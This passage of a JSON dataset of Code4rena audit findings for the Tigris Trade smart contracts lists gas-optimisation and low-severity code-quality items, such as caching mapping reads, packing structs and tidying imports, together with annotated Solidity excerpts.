      "content": "The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata\n\n*There are 39 instances of this issue:*\n\n```solidity\nFile: contracts/PairsContract.sol\n\n/// @audit _idToAsset[_asset] on line 34\n36:           _idToAsset[_asset].chainlinkFeed = _feed;\n\n/// @audit _idToAsset[_asset] on line 49\n55:           _idToAsset[_asset].name = _name;\n\n/// @audit _idToAsset[_asset] on line 55\n57:           _idToAsset[_asset].chainlinkFeed = _chainlinkFeed;\n\n/// @audit _idToAsset[_asset] on line 57\n59:           _idToAsset[_asset].minLeverage = _minLeverage;\n\n/// @audit _idToAsset[_asset] on line 59\n60:           _idToAsset[_asset].maxLeverage = _maxLeverage;\n\n/// @audit _idToAsset[_asset] on line 60\n61:           _idToAsset[_asset].feeMultiplier = _feeMultiplier;\n\n/// @audit _idToAsset[_asset] on line 61\n62:           _idToAsset[_asset].baseFundingRate = _baseFundingRate;\n\n/// @audit _idToAsset[_asset] on line 74\n78:               _idToAsset[_asset].maxLeverage = _maxLeverage;\n\n/// @audit _idToAsset[_asset] on line 78\n81:               _idToAsset[_asset].minLeverage = _minLeverage;\n\n/// @audit _idToAsset[_asset] on line 81\n/// @audit _idToAsset[_asset] on line 84\n84:           require(_idToAsset[_asset].maxLeverage >= _idToAsset[_asset].minLeverage, \"Wrong leverage values\");\n\n/// @audit _idToAsset[_asset] on line 93\n96:           _idToAsset[_asset].baseFundingRate = _baseFundingRate;\n\n/// @audit _idToAsset[_asset] on line 105\n107:          _idToAsset[_asset].feeMultiplier = _feeMultiplier;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L36\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit _limitOrders[<etc>] on line 150\n151:              _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;\n\n/// @audit _assetOpenPositions[<etc>] on line 157\n158:              _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;\n\n/// @audit _limitOrders[_asset] on line 177\n178:          _limitOrders[_asset][_limitOrderIndexes[_asset][_id]] = _limitOrders[_asset][_limitOrders[_asset].length-1];\n\n/// @audit _limitOrders[_asset] on line 178\n180:          _limitOrders[_asset].pop();\n\n/// @audit _assetOpenPositions[_asset] on line 184\n185:          _assetOpenPositionsIndexes[_asset][_id] = _assetOpenPositions[_asset].length-1;\n\n/// @audit _trades[_id] on line 198\n199:          _trades[_id].leverage = _newLeverage;\n\n/// @audit _trades[_id] on line 210\n211:          _trades[_id].price = _newPrice;\n\n/// @audit _trades[_id] on line 211\n/// @audit _trades[_id] on line 212\n/// @audit _trades[_id] on line 212\n/// @audit _trades[_id] on line 212\n212:          initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_newMargin*_trades[_id].leverage/1e18)/1e18;\n\n/// @audit _trades[_id] on line 231\n231:          _trades[_id].accInterest -= _trades[_id].accInterest*int256(_percent)/int256(DIVISION_CONSTANT);\n\n/// @audit _trades[_id] on line 231\n/// @audit _trades[_id] on line 232\n232:          _trades[_id].margin -= _trades[_id].margin*_percent/DIVISION_CONSTANT;\n\n/// @audit _trades[_id] on line 232\n/// @audit _trades[_id] on line 233\n/// @audit _trades[_id] on line 233\n/// @audit _trades[_id] on line 233\n/// @audit _trades[_id] on line 233\n233:          initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_trades[_id].margin*_trades[_id].leverage/1e18)/1e18;\n\n/// @audit _trades[_id] on line 262\n263:          if (_trades[_id].orderType > 0) {\n\n/// @audit _limitOrders[_asset] on line 264\n265:              _limitOrders[_asset][_limitOrderIndexes[_asset][_id]] = _limitOrders[_asset][_limitOrders[_asset].length-1];\n\n/// @audit _limitOrders[_asset] on line 265\n267:              _limitOrders[_asset].pop();            \n\n/// @audit _assetOpenPositions[_asset] on line 269\n270:              _assetOpenPositions[_asset][_assetOpenPositionsIndexes[_asset][_id]] = _assetOpenPositions[_asset][_assetOpenPositions[_asset].length-1];\n\n/// @audit _assetOpenPositions[_asset] on line 270\n272:              _assetOpenPositions[_asset].pop();  \n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L151\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit blockDelayPassed[_id] on line 861\n864:                  blockDelayPassed[_id].delay = block.number + blockDelay;\n\n/// @audit blockDelayPassed[_id] on line 864\n865:                  blockDelayPassed[_id].actionType = _type;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L864\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43199",
      "title": "[G-06]  Avoid contract existence checks by using low level calls",
      "impact": "GAS",
      "content": "Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence\n\n*There are 40 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit transfer()\n185:          IERC20(tigAsset).transfer(manager, amount);\n\n/// @audit transfer()\n202:          IERC20(_tigAsset).transfer(manager, amount);\n\n/// @audit transferFrom()\n216:          IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L185\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit excessivelySafeCall()\n175:          (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));\n\n/// @audit transfer()\n279:          IERC20(_tigAsset).transfer(_msgsender, amount);\n\n/// @audit transferFrom()\n289:          try IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L175\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit transfer()\n39:           IERC20(_tigAsset).transfer(msg.sender, _amount);\n\n/// @audit transfer()\n52:           IERC20(_tigAsset).transfer(msg.sender, amount);\n\n/// @audit transferFrom()\n72:           IERC20(_asset).transferFrom(msg.sender, address(this), _amount);\n\n/// @audit transferFrom()\n90:           IERC20(_asset).transferFrom(msg.sender, address(this), _amount);\n\n/// @audit transfer()\n104:          IERC20(asset).transfer(_owner, amount);\n\n/// @audit balanceOf()\n114:              uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));\n\n/// @audit claim()\n115:              IGovNFT(govNFT).claim(assets[i]);\n\n/// @audit balanceOf()\n116:              uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));\n\n/// @audit approve()\n117:              IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L39\n\n```solidity\nFile: contracts/StableVault.sol\n\n/// @audit transferFrom()\n46:           IERC20(_token).transferFrom(_msgSender(), address(this), _amount);\n\n/// @audit decimals()\n49:               _amount*(10**(18-IERC20Mintable(_token).decimals()))\n\n/// @audit decimals()\n67:           _output = _amount/10**(18-IERC20Mintable(_token).decimals());\n\n/// @audit transfer()\n68:           IERC20(_token).transfer(\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L46\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit stable()\n175:          address _tigAsset = IStableVault(_tradeInfo.stableVault).stable();\n\n/// @audit stable()\n324:          address _tigAsset = IStableVault(_tradeInfo.stableVault).stable();\n\n/// @audit transfer()\n588:          payable(_proxy).transfer(msg.value);\n\n/// @audit decimals()\n650:              uint _marginDecMultiplier = 10**(18-ExtendedIERC20(_marginAsset).decimals());\n\n/// @audit transferFrom()\n651:              IERC20(_marginAsset).transferFrom(_trader, address(this), _margin/_marginDecMultiplier);\n\n/// @audit approve()\n652:              IERC20(_marginAsset).approve(_stableVault, type(uint).max);\n\n/// @audit transfer()\n671:              IERC20(_outputToken).transfer(_trade.trader, _toMint);\n\n/// @audit balanceOf()\n673:              uint256 _balBefore = IERC20(_outputToken).balanceOf(address(this));\n\n/// @audit withdraw()\n674:              IStableVault(_stableVault).withdraw(_outputToken, _toMint);\n\n/// @audit balanceOf()\n/// @audit decimals()\n675:              if (IERC20(_outputToken).balanceOf(address(this)) != _balBefore + _toMint/(10**(18-ExtendedIERC20(_outputToken).decimals()))) revert BadWithdraw();\n\n/// @audit transfer()\n/// @audit balanceOf()\n676:              IERC20(_outputToken).transfer(_trade.trader, IERC20(_outputToken).balanceOf(address(this)) - _balBefore);\n\n/// @audit balanceOf()\n749:          gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n\n/// @audit approve()\n807:          IStable(_tigAsset).approve(address(gov), type(uint).max);\n\n/// @audit stable()\n/// @audit allowed()\n877:          require(_token == IStableVault(_stableVault).stable() || IStableVault(_stableVault).allowed(_token), \"Token not approved in vault\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L175\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n/// @audit trades()\n77:           IPosition.Trade memory _trade = IPosition(_positions).trades(_id);\n\n/// @audit recover()\n102           address _provider = (\n103               keccak256(abi.encode(_priceData))\n104:          ).toEthSignedMessageHash().recover(_signature);\n\n/// @audit latestAnswer()\n113:              int256 assetChainlinkPriceInt = IPrice(_chainlinkFeed).latestAnswer();\n\n/// @audit decimals()\n115:                  uint256 assetChainlinkPrice = uint256(assetChainlinkPriceInt) * 10**(18 - IPrice(_chainlinkFeed).decimals());\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L77\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43198",
      "title": "[G-05]  Using `storage` instead of `memory` for structs/arrays saves gas",
      "impact": "GAS",
      "content": "When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/Trading.sol\n\n700:          Fees memory _fees = openFees;\n\n774:          Fees memory _fees = closeFees;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L700\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43197",
      "title": "[G-04]  Structs can be packed into fewer storage slots",
      "impact": "GAS",
      "content": "Each slot saved can avoid an extra Gsset (**20000 gas**) for the first setting of the struct. \n\nSubsequent reads as well as writes have smaller gas savings.\n\n*There are 6 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit Variable ordering with 10 slots instead of the current 11:\n///           uint256(32):id, uint256(32):amount, uint256(32):mintEpoch, uint256(32):mintTime, uint256(32):expireEpoch, uint256(32):pending, uint256(32):shares, uint256(32):period, address(20):owner, bool(1):expired, address(20):asset\n12        struct Bond {\n13            uint id;\n14            address owner;\n15            address asset;\n16            uint amount;\n17            uint mintEpoch;\n18            uint mintTime;\n19            uint expireEpoch;\n20            uint pending;\n21            uint shares;\n22            uint period;\n23            bool expired;\n24:       }\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L12-L24\n\n```solidity\nFile: contracts/interfaces/IPosition.sol\n\n/// @audit Variable ordering with 11 slots instead of the current 12:\n///           uint256(32):margin, uint256(32):leverage, uint256(32):asset, uint256(32):price, uint256(32):tpPrice, uint256(32):slPrice, uint256(32):orderType, uint256(32):id, int256(32):accInterest, address(20):trader, bool(1):direction, address(20):tigAsset\n7         struct Trade {\n8             uint margin;\n9             uint leverage;\n10            uint asset;\n11            bool direction;\n12            uint price;\n13            uint tpPrice;\n14            uint slPrice;\n15            uint orderType;\n16            address trader;\n17            uint id;\n18            address tigAsset;\n19            int accInterest;\n20:       }\n\n/// @audit Variable ordering with 9 slots instead of the current 10:\n///           uint256(32):margin, uint256(32):leverage, uint256(32):asset, uint256(32):price, uint256(32):tp, uint256(32):sl, uint256(32):orderType, address(20):account, bool(1):direction, address(20):tigAsset\n22        struct MintTrade {\n23            address account;\n24            uint256 margin;\n25            uint256 leverage;\n26            uint256 asset;\n27            bool direction;\n28            uint256 price;\n29            uint256 tp;\n30            uint256 sl;\n31            uint256 orderType;\n32            address tigAsset;\n33:       }\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPosition.sol#L7-L20\n\n```solidity\nFile: contracts/interfaces/ITrading.sol\n\n/// @audit Variable ordering with 8 slots instead of the current 9:\n///           uint256(32):margin, uint256(32):leverage, uint256(32):asset, uint256(32):tpPrice, uint256(32):slPrice, bytes32(32):referral, address(20):marginAsset, bool(1):direction, address(20):stableVault\n9         struct TradeInfo {\n10            uint256 margin;\n11            address marginAsset;\n12            address stableVault;\n13            uint256 leverage;\n14            uint256 asset;\n15            bool direction;\n16            uint256 tpPrice;\n17            uint256 slPrice;\n18            bytes32 referral;\n19:       }\n\n/// @audit Variable ordering with 5 slots instead of the current 6:\n///           uint256(32):deadline, uint256(32):amount, bytes32(32):r, bytes32(32):s, uint8(1):v, bool(1):usePermit\n21        struct ERC20PermitData {\n22            uint256 deadline;\n23            uint256 amount;\n24            uint8 v;\n25            bytes32 r;\n26            bytes32 s;\n27            bool usePermit;\n28:       }\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ITrading.sol#L9-L19\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n/// @audit Variable ordering with 5 slots instead of the current 6:\n///           uint256(32):asset, uint256(32):price, uint256(32):spread, uint256(32):timestamp, address(20):provider, bool(1):isClosed\n12    struct PriceData {\n13        address provider;\n14        uint256 asset;\n15        uint256 price;\n16        uint256 spread;\n17        uint256 timestamp;\n18        bool isClosed;\n19:   }\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L12-L19\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43196",
      "title": "[G-03]  State variables can be packed into fewer storage slots",
      "impact": "GAS",
      "content": "If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n/// @audit Variable ordering with 9 slots instead of the current 10:\n///           uint256(32):validSignatureTimer, mapping(32):isNode, mapping(32):minPositionSize, mapping(32):allowedMargin, uint256(32):maxGasPrice, address(20):trading, bool(1):chainlinkEnabled, bool(1):paused, address(20):pairsContract, address(20):referrals, address(20):position\n13:       address public trading;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L13\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43195",
      "title": "[G-02]  State variables only set in the constructor should be declared `immutable`",
      "impact": "GAS",
      "content": "Avoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**). \n\nWhile `string`s are not value types, and therefore cannot be `immutable`/`constant` if not hard-coded outside of the constructor, the same behavior can be achieved by making the current contract `abstract` with `virtual` functions for the `string` accessors, and having a child contract override the functions with the hard-coded implementation-specific values.\n\n*There are 7 instances of this issue:*\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n/// @audit trading (constructor)\n35:           trading = _trading;\n\n/// @audit pairsContract (constructor)\n36:           pairsContract = IPairsContract(_pairsContract);\n\n/// @audit referrals (constructor)\n37:           referrals = IReferrals(_ref);\n\n/// @audit position (constructor)\n38:           position = IPosition(_position);\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L35\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit pairsContract (constructor)\n151:          pairsContract = IPairsContract(_pairsContract);\n\n/// @audit position (constructor)\n149:          position = IPosition(_position);\n\n/// @audit gov (constructor)\n150:          gov = IGovNFT(_gov);\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L151\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43194",
      "title": "[G-01]  Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate",
      "impact": "GAS",
      "content": "Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.\n\n*There are 5 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n32        mapping(address => bool) public allowedAsset;\n33:       mapping(address => uint) private assetsIndex;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L32-L33\n\n```solidity\nFile: contracts/GovNFT.sol\n\n265       mapping(address => bool) private _allowedAsset;\n266       mapping(address => uint) private assetsIndex;\n267       mapping(address => mapping(address => uint256)) private userPaid;\n268       mapping(address => mapping(address => uint256)) private userDebt;\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L265-L269\n\n```solidity\nFile: contracts/Position.sol\n\n26        mapping(uint256 => uint256[]) private _assetOpenPositions;\n27        mapping(uint256 => mapping(uint256 => uint256)) private _assetOpenPositionsIndexes;\n28    \n29        mapping(uint256 => uint256[]) private _limitOrders; // List of limit order nft ids per asset\n30        mapping(uint256 => mapping(uint256 => uint256)) private _limitOrderIndexes; // Keeps track of asset -> id -> array index\n31    \n32        // Funding\n33        mapping(uint256 => mapping(address => int256)) public fundingDeltaPerSec;\n34        mapping(uint256 => mapping(address => mapping(bool => int256))) private accInterestPerOi;\n35        mapping(uint256 => mapping(address => uint256)) private lastUpdate;\n36        mapping(uint256 => int256) private initId;\n37        mapping(uint256 => mapping(address => uint256)) private longOi;\n38:       mapping(uint256 => mapping(address => uint256)) private shortOi;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L24-L38\n\n```solidity\nFile: contracts/StableVault.sol\n\n29        mapping(address => bool) public allowed;\n30:       mapping(address => uint) private tokenIndex;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L29-L30\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n17        mapping(address => bool) private isNode;\n18        mapping(address => uint) public minPositionSize;\n19:       mapping(address => bool) public allowedMargin;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L17-L19\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43193",
      "title": "[28] Large multiples of ten should use scientific notation.",
      "impact": "LOW",
      "content": "\nUsing scientific notation for large multiples of ten will improve code readability.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L26\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/657#issuecomment-1366191229):**\n> [01] Use `.call` instead of `.transfer` to send ether\n>\n> Low\n> \n> [02] Unbounded loop\n>\n> Low\n> \n> [03] Use the safe variant and `ERC721.mint`\n>\n> Low\n> \n> [04] Usage of deprecated chainlink API\n>\n> Low\n> \n> [05] Lack of checks-effects-interactions\n>\n> Low\n> \n> [06] Lack of zero address checks for `Trading.sol` constructor for the variables `_position`, `_gov` and `_pairsContract`\n>\n> Low\n> \n> [07] Add an event for critical parameter changes\n>\n> Non-Critical\n> \n> [08] Missing unit tests\n>\n> Refactoring\n> \n> [09] Pragma float\n>\n> Non-Critical\n> \n> [10] Contract layout and order of functions\n>\n> Non-Critical\n> \n> [11] Use time units directly\n>\n> Refactoring\n> \n> [12] Declare interfaces on separate files\n>\n> Refactoring\n> \n> [13] Constants should be upper case\n>\n> Refactoring\n> \n> [14] Use `private constant` consistently\n>\n> Non-Critical\n> \n> [15] Add a limit for the maximum number of characters per line\n>\n> Non-Critical\n> \n> [16] Declaring a `return named variable` and returning a manual value for the same function\n>\n> Refactoring\n> \n> [17] Lack of spacing in comment\n>\n> Non-Critical\n> \n> [18] Critical changes should use two-step procedure\n>\n> Non-Critical\n> \n> [19] Missing NATSPEC\n>\n> Non-Critical\n> \n> [20] Interchangeable usage of uint and uint256\n>\n> Non-Critical\n> \n> [21] Move require/validation statements to the top of the function when validating input parameters\n>\n> Refactoring\n> \n> [22] Remove console.log import in `Lock.sol`\n>\n> Non-Critical\n> \n> [23] Draft openzeppelin dependencies\n>\n> Refactoring\n> \n> [24] Named imports can be used\n>\n> Non-Critical\n> \n> [25] Imports can be grouped together\n>\n> Non-Critical\n> \n> [26] Constant redefined elsewhere\n>\n> Refactoring\n> \n> [27] Convert repeated validation statements into a function modifier to improve code reusability\n>\n> Refactoring\n> \n> [28] Large multiples of ten should use scientific notation.\n>\n> Refactoring\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43192",
      "title": "[27] Convert repeated validation statements into a function modifier to improve code reusability",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L107\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L330\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43191",
      "title": "[26] Constant redefined elsewhere",
      "impact": "LOW",
      "content": "\nConsider defining in only one contract so that values cannot become out of sync when only one location is updated. \n\nA cheap way to store constants in a single location is to create an internal constant in a library. If the variable is a local cache of another contract’s value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don’t get out of sync.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L95\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L11\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43190",
      "title": "[25] Imports can be grouped together",
      "impact": "LOW",
      "content": "\nConsider importing OZ first, then all interfaces, then all utils.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L4-L12\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L4-L8\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43189",
      "title": "[24] Named imports can be used",
      "impact": "LOW",
      "content": "\nIt's possible to name the imports to improve code readability. E.g. `import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";` can be rewritten as `import {IERC20} from “import “@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol”;`\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L6\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43188",
      "title": "[23] Draft OpenZeppelin dependencies",
      "impact": "LOW",
      "content": "\nOpenZeppelin contracts may be considered draft contracts if they have not received adequate security auditing or are liable to change with future development.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableToken.sol#L4\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableToken.sol#L7\n\n### Recommendation\n\nConsider waiting until the contract is finalized. Otherwise, make sure that the development team is aware of the risks of using a draft OpenZeppelin contract and accept the risk-benefit trade-off.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43187",
      "title": "[22] Remove console.log import in `Lock.sol`",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L4\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43186",
      "title": "[21] Move require/validation statements to the top of the function when validating input parameters",
      "impact": "LOW",
      "content": "\nConsider moving the validation on [L966](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L966) above the conditional on [L955](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L955) for `Trading.setFees()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43185",
      "title": "[20] Interchangeable usage of uint and uint256",
      "impact": "LOW",
      "content": "\nConsider using only one approach throughout the codebase, e.g. only uint or only uint256.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L223-L224\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L316-L317\n\n",
      "summary": "",
